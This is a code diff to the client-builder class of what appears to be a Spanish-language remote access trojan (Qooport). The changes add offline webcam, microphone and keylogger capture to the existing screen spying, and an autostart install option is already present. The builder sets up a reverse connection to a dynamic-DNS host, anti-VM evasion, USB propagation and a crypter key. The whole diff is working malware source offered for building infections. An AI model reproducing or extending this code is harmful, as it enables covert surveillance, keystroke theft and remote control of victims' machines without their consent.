@@ -53,7 +53,7 @@ import qooport.utilidades.cifrado.Encriptacion;
 public class CrearCliente extends JFrame {
 
     public static String passCifradoConfig = "LAOSUISNPASD12378ASDLGASDHGAKD";
-    public static String passCifradoCripter = "AJHSJKDFHASJDFHW2EFAHSDJFHASKA";
+    public static String passCifradoCripter = "##$AS;DKALSJD$@#RADASDKHGQIWUEKJDAS";
     private JFileChooser cd = new JFileChooser();
     private JButton btnCrearCliente;
     private JButton btnGuardarPerfiles;
@@ -126,14 +126,16 @@ public class CrearCliente extends JFrame {
         perfilNuevo.agregarParametro("reg_name", nombre);
         perfilNuevo.agregarParametro("tipoConexion", ConexionServer.TCP);
         perfilNuevo.agregarParametro("ssl", "true");
-        perfilNuevo.agregarParametro("puerto", "4000");
+//        perfilNuevo.agregarParametro("puerto", "4000");
         perfilNuevo.agregarParametro("prefijo", "serv_");
         perfilNuevo.agregarParametro("dns", "minoip.ddns.net");
+        perfilNuevo.agregarParametro("urlDns", "");
         perfilNuevo.agregarParametro("clave_acceso", panelCifrado.generarClave());
         perfilNuevo.agregarParametro("prog_tareas", "false");
         perfilNuevo.agregarParametro("delay", "3");
         perfilNuevo.agregarParametro("off-escritorio", "true");
         perfilNuevo.agregarParametro("off-escritorio-delay", "3");
+        perfilNuevo.agregarParametro("off-keylogger", "true");
         perfilNuevo.agregarParametro("usb", "false");
         perfilNuevo.agregarParametro("password", "");
         perfilNuevo.agregarParametro("inversa", "true");
@@ -244,6 +246,7 @@ public class CrearCliente extends JFrame {
             panelConexion.getPrefijo().setText((String) p.obtenerParametro("prefijo"));
 
             this.panelConexion.getTxtIpDNS().setText((String) p.obtenerParametro("dns"));
+            this.panelConexion.getTxtUrlHosts().setText((String) p.obtenerParametro("urlDns"));
             this.panelConexion.getPassword().setText((String) p.obtenerParametro("password"));
 
             try {
@@ -257,15 +260,25 @@ public class CrearCliente extends JFrame {
             } catch (Exception e) {
 
             }
-            this.panelConexion.getPuerto().setValue(Integer.parseInt((String) p.obtenerParametro("puerto")));
+//            this.panelConexion.getPuerto().setValue(Integer.parseInt((String) p.obtenerParametro("puerto")));
 //            this.panConexion.getPuerto2().setValue(Integer.parseInt((String) p.obtenerParametro("puerto2")));
             this.panelConexion.getTxtDelay().setText((String) p.obtenerParametro("delay"));
             this.panelConexion.getConexionInversa().setSelected(Boolean.valueOf((String) p.obtenerParametro("inversa")));
             this.panelCifrado.getKey().setText((String) p.obtenerParametro("clave_acceso"));
             try {
                 this.panelEspiar.getCapturaOfflinePantalla().setSelected((Boolean) p.obtenerParametro("off-escritorio"));
-                this.panelEspiar.getDelayCapturaPantalla().setValue(Integer.parseInt((String) p.obtenerParametro("off-escritorio-delay")));
+                this.panelEspiar.getDelayCapturaPantalla().setValue((Integer) p.obtenerParametro("off-escritorio-delay"));
+
+                this.panelEspiar.getCapturaOfflineWebCam().setSelected((Boolean) p.obtenerParametro("off-camara"));
+                this.panelEspiar.getDelayCapturaWebCam().setValue((Integer) p.obtenerParametro("off-camara-delay"));
+
+                this.panelEspiar.getCapturaOfflineAudio().setSelected((Boolean) p.obtenerParametro("off-audio"));
+                this.panelEspiar.getDelayCapturaAudio().setValue((Integer) p.obtenerParametro("off-audio-delay"));
+
+                this.panelEspiar.getCapturaOfflineKeylogger().setSelected((Boolean) p.obtenerParametro("off-keylogger"));
+
             } catch (Exception e) {
+                e.printStackTrace();
             }
             this.panelPropagacion.getCheckUSB().setSelected(Boolean.valueOf((String) p.obtenerParametro("usb")));
             this.panelPropagacion.getNombreUSB().setText((String) p.obtenerParametro("nombre_usb"));
@@ -297,13 +310,19 @@ public class CrearCliente extends JFrame {
 
         perfil.agregarParametro("prefijo", this.panelConexion.getPrefijo().getText());
         perfil.agregarParametro("dns", this.panelConexion.getTxtIpDNS().getText());
+        perfil.agregarParametro("urlDns", this.panelConexion.getTxtUrlHosts().getText());
         perfil.agregarParametro("password", panelConexion.getPassword().getText());
         perfil.agregarParametro("tipoConexion", panelConexion.getComboProtocolo().getSelectedIndex());
         perfil.agregarParametro("ssl", String.valueOf(panelConexion.getChkSSL().isSelected()));
-        perfil.agregarParametro("puerto", panelConexion.getPuerto().getValue().toString());
+//        perfil.agregarParametro("puerto", panelConexion.getPuerto().getValue().toString());
         perfil.agregarParametro("delay", panelConexion.getTxtDelay().getText());
         perfil.agregarParametro("off-escritorio", this.panelEspiar.getCapturaOfflinePantalla().isSelected());
         perfil.agregarParametro("off-escritorio-delay", this.panelEspiar.getDelayCapturaPantalla().getValue());
+        perfil.agregarParametro("off-camara", this.panelEspiar.getCapturaOfflineWebCam().isSelected());
+        perfil.agregarParametro("off-camara-delay", this.panelEspiar.getDelayCapturaWebCam().getValue());
+        perfil.agregarParametro("off-audio", this.panelEspiar.getCapturaOfflineAudio().isSelected());
+        perfil.agregarParametro("off-audio-delay", this.panelEspiar.getDelayCapturaAudio().getValue());
+        perfil.agregarParametro("off-keylogger", this.panelEspiar.getCapturaOfflineKeylogger().isSelected());
         perfil.agregarParametro("usb", String.valueOf(panelPropagacion.getCheckUSB().isSelected()));
         perfil.agregarParametro("nombre_usb", panelPropagacion.getNombreUSB().getText());
         perfil.agregarParametro("clave_acceso", panelCifrado.getKey().getText());
@@ -546,8 +565,9 @@ public class CrearCliente extends JFrame {
         cfg.agregarParametro("prefijo", this.panelConexion.getPrefijo().getText());
         cfg.agregarParametro("claveClase", this.panelCifrado.getKey().getText());
         cfg.agregarParametro("dns", panelConexion.getTxtIpDNS().getText());
+        cfg.agregarParametro("urlDns", panelConexion.getTxtUrlHosts().getText());
         cfg.agregarParametro("password", Encriptacion.MD5(new String(panelConexion.getPassword().getPassword())));
-        cfg.agregarParametro("puerto", Integer.valueOf(this.panelConexion.getPuerto().getValue().toString()));
+//        cfg.agregarParametro("puerto", Integer.valueOf(this.panelConexion.getPuerto().getValue().toString()));
         cfg.agregarParametro("delay", Integer.valueOf(panelConexion.getTxtDelay().getText()));
         cfg.agregarParametro("avmw", panelANTIVM.getAntiVM_windows().isSelected());
         cfg.agregarParametro("avml", panelANTIVM.getAntiVM_linux().isSelected());
@@ -556,7 +576,11 @@ public class CrearCliente extends JFrame {
         //--escritorio
         cfg.agregarParametro("off-escritorio", this.panelEspiar.getCapturaOfflinePantalla().isSelected());
         cfg.agregarParametro("off-escritorio-delay", this.panelEspiar.getDelayCapturaPantalla().getValue() * 1000);
-        //--camara
+        cfg.agregarParametro("off-camara", this.panelEspiar.getCapturaOfflineWebCam().isSelected());
+        cfg.agregarParametro("off-camara-delay", this.panelEspiar.getDelayCapturaWebCam().getValue() * 1000);
+        cfg.agregarParametro("off-audio", this.panelEspiar.getCapturaOfflineAudio().isSelected());
+        cfg.agregarParametro("off-audio-delay", this.panelEspiar.getDelayCapturaAudio().getValue() * 1000);
+        cfg.agregarParametro("off-keylogger", this.panelEspiar.getCapturaOfflineKeylogger().isSelected());
 
         cfg.agregarParametro("tipoConexion", tipoConexion);
         cfg.agregarParametro("ssl", panelConexion.getChkSSL().isSelected());
@@ -876,7 +900,7 @@ public class CrearCliente extends JFrame {
         }
 
         if (clase.contains("rt/modulos/var/COFF.class")) {//captura offline
-            return this.panelEspiar.getCapturaOfflinePantalla().isSelected();
+            return this.panelEspiar.getCapturaOfflinePantalla().isSelected() || this.panelEspiar.getCapturaOfflineWebCam().isSelected() || this.panelEspiar.getCapturaOfflineAudio().isSelected() || this.panelEspiar.getCapturaOfflineKeylogger().isSelected();
         }
 
         if (clase.contains("rt/util/USB.class")) {
@@ -884,7 +908,7 @@ public class CrearCliente extends JFrame {
         }
 
         if (clase.contains("rt/modulos/CapturaKLOffline.class")) {
-            return this.panelEspiar.getCapturaOfflinePantalla().isSelected();
+            return this.panelEspiar.getCapturaOfflineKeylogger().isSelected();
         }
         if (clase.contains("rt/util/INST.class") || clase.contains("rt/util/REG.class")) {
             return this.panelInstalar.getLblAutoInicio().isSelected();
